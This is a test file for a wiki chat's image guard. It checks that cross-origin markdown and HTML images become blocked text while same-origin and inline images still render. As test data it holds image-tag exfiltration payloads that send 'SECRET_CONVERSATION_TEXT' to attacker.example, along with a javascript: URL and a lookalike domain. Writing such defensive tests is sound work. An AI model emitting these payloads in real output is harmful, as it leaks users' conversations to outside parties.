import { expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { WikiMarkdown } from "@oncobase/wiki-markdown";
import { ChatImage, isChatImageAllowed } from "./chat-image";

const EXFIL = "![x](https://attacker.example/p.png?d=SECRET_CONVERSATION_TEXT)";
const HTML_EXFIL = '<img src="https://attacker.example/q.png?d=SECRET_CONVERSATION_TEXT">';
const SITE = "https://wiki.example";

test("chat never loads cross-origin images: markdown and raw HTML images become inert text", () => {
  for (const markdown of [EXFIL, HTML_EXFIL, "![x](//attacker.example/p.png)", "![x](http://127.0.0.1:9/p.png)"]) {
    const html = renderToStaticMarkup(<WikiMarkdown content={markdown} ImageComponent={ChatImage} />);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example/p.png?d=");
    expect(html).not.toContain("attacker.example/q.png");
    expect(html).toContain("external image blocked");
  }
  // Positive control: the default renderer would load it.
  expect(renderToStaticMarkup(<WikiMarkdown content={EXFIL} />)).toContain('src="https://attacker.example/p.png');
});

test("same-origin and inline images, including proxied wiki assets, still render in chat", () => {
  const html = renderToStaticMarkup(<WikiMarkdown content={"![fig](figures/a.png) ![d](data:image/png;base64,AAAA)"} currentSlug="wiki/a" ImageComponent={ChatImage} />);
  expect(html.match(/<img/g)?.length).toBe(2);
  expect(isChatImageAllowed("/api/file?path=a.png")).toBe(true);
  expect(isChatImageAllowed(`${SITE}/api/file?path=a.png`, SITE)).toBe(true);
  expect(isChatImageAllowed("https://wiki.example.evil.test/x.png", SITE)).toBe(false);
  expect(isChatImageAllowed("javascript:alert(1)", SITE)).toBe(false);
  expect(isChatImageAllowed("data:text/html;base64,AAAA", SITE)).toBe(false);
  expect(isChatImageAllowed(undefined, SITE)).toBe(false);
});

test("the chat transcript renderer is wired to the image guard", async () => {
  const source = await Bun.file(new URL("./ChatProviders.tsx", import.meta.url)).text();
  expect(source).toContain("ImageComponent={ChatImage}");
});
